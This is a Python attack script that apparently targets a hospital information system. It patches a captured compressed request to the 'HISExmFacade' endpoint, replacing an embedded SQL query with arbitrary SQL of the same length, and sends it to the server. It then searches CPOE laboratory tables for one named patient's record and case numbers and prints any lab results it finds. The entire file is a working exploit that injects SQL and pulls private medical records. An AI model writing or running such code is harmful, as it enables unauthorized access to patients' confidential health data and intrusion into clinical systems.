from his_client_final import HISClient
import requests
import zlib
import re

class CPOEHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = CPOEHunter()
hhisnum = '003617083J'
caseno_inp = '75176986'
caseno_opd = '46806581'

tables = [
    "CPOE.ORDLAB",
    "CPOE.LABSHEET",
    "CPOE.LABRPTTMP",
    "CPOE.LABEXAM_INFO"
]

for t in tables:
    print(f"\nScanning {t}...")
    
    # Try HHISNUM
    q1 = f"SELECT * FROM {t} WHERE HHISNUM = '{hhisnum}'"
    r1 = hunter.execute_sql(q1)
    if r1 and "<NewDataSet>" in r1:
         print(f"!!! FOUND DATA IN {t} (HHISNUM) !!!")
         print(r1[:2000])
         if "WBC" in r1: print("!!! FOUND WBC !!!")

    # Try HCASENO / CASENO
    # CPOE usually uses CASENO or ORDSEQ?
    # Let's try HCASENO first
    q2 = f"SELECT * FROM {t} WHERE HCASENO = '{caseno_inp}'"
    r2 = hunter.execute_sql(q2)
    if r2 and "<NewDataSet>" in r2:
         print(f"!!! FOUND DATA IN {t} (HCASENO INP) !!!")
         print(r2[:2000])
         
    q3 = f"SELECT * FROM {t} WHERE HCASENO = '{caseno_opd}'"
    r3 = hunter.execute_sql(q3)
    if r3 and "<NewDataSet>" in r3:
         print(f"!!! FOUND DATA IN {t} (HCASENO OPD) !!!")
         print(r3[:2000])

    if not (r1 and "<NewDataSet>" in r1) and not (r2 and "<NewDataSet>" in r2) and not (r3 and "<NewDataSet>" in r3):
         # Check sample for columns
         q_samp = f"SELECT * FROM {t} WHERE ROWNUM <= 1"
         rs = hunter.execute_sql(q_samp)
         if rs and "<NewDataSet>" in rs:
             print(f"Sample from {t}:")
             print(rs[:500])
